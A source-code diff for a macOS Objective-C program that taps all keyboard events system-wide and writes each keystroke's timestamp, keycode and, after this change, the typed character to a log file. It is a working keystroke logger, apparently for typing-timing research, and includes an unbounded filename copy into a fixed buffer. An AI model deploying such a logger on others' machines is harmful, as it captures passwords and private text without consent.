@@ -8,12 +8,13 @@
 
 #import <ApplicationServices/ApplicationServices.h>
 #import <mach/mach_time.h>
+#import <Carbon/Carbon.h>
 
-FILE* openLogFile()
-{
+
+void readLogFileName(char* pLogFileName2){
 	NSBundle*	mainBundle;
 	NSString*	logFileNameNS;
-	FILE*		pLogFile;
+	int fnLen;
 	
 	// memory management, construct pool
 	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -23,19 +24,38 @@ FILE* openLogFile()
 	
 	// read Log file name
 	logFileNameNS = [mainBundle objectForInfoDictionaryKey:@"logFile"];
+	
 	// to cString
-	const char *pLogFileName = [logFileNameNS UTF8String];
+	const char *pLocalLogFileName = [logFileNameNS UTF8String];
 	
+	// copy it to correct pointer (TODO: this could be smarter)
+	fnLen = strlen(pLocalLogFileName) + 1;
+	strncpy(pLogFileName2, pLocalLogFileName, sizeof(char)*fnLen);
 	
-	if (!strcmp(pLogFileName,"stdout")){
+	// free memory
+	[pool drain];
+}
+
+
+
+FILE* openLogFile()
+{
+	FILE*		pLogFile;
+	char      pLogFileName[65536];
+	
+	readLogFileName(pLogFileName);
+	
+	if (pLogFileName[0] == 's' && 
+		pLogFileName[1] == 't' &&
+		pLogFileName[2] == 'd' &&
+		pLogFileName[3] == 'o' &&
+		pLogFileName[4] == 'u' &&
+		pLogFileName[5] == 't'){
 		pLogFile = stdout;
 	}
 	else {
 		pLogFile = fopen(pLogFileName, "a");
 	}
-
-	// free all memory
-	[pool drain];
 	
 	return pLogFile;
 }
@@ -54,16 +74,32 @@ CGEventRef recordKeysCallback(CGEventTapProxy	proxy,
 	
 	unsigned long long	currentTime; 
 	long long			keycode;
+	UniChar				uc[10];
+	UniCharCount		ucc;
 	
 	currentTime = mach_absolute_time();
 	keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+	CGEventKeyboardGetUnicodeString(event,10,&ucc,uc);
 	
-	fprintf((FILE*)pLogFile, 
-			"<key><time>%llu</time><type>%u</type><keycode>%llu</keycode></key>\n",
-			(unsigned long long)		currentTime,
-			(unsigned int)			type,
-			(long long)				keycode);
-	
+	if ((uc[0] < 128) && (uc[0] >= 41)){
+			fprintf((FILE*)pLogFile, 
+					"<key><time>%llu</time><type>%u</type><keycode>%llu</keycode><unichar>%04x</unichar><ascii>%c</ascii></key>\n",
+					(unsigned long long)	currentTime,
+					(unsigned int)			type,
+					(long long)				keycode,
+					uc[0],
+					uc[0]);
+		
+	}
+	else { // disable rest
+		fprintf((FILE*)pLogFile, 
+				"<key><time>%llu</time><type>%u</type><keycode>%llu</keycode><unichar>%04x</unichar></key>\n",
+				(unsigned long long)		currentTime,
+				(unsigned int)			type,
+				(long long)				keycode,
+				uc[0]);
+	}
+
 	return event; 
 }
 
@@ -77,14 +113,14 @@ void createEventListenerLoopSourceAndRun(FILE* pLogFile)
 								kCGHeadInsertEventTap, 
 								0, 
 								kCGEventMaskForAllEvents, 
-								recordKeysCallback,   // this is the function called
+								recordKeysCallback,   // <-- this is the function called
 								(void*)pLogFile);
 	
 	// wrap event listener to loopable form
 	runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, 
 												  eventTap, 
 												  0);
-	// add wrapped listener loop
+	// add wrapped listener to loop
 	CFRunLoopAddSource(CFRunLoopGetCurrent(), 
 					   runLoopSource, 
 					   kCFRunLoopCommonModes);
@@ -104,3 +140,4 @@ int main (int argc, const char * argv[]) {
 	createEventListenerLoopSourceAndRun(pLogFile);
     return 0;
 }
+
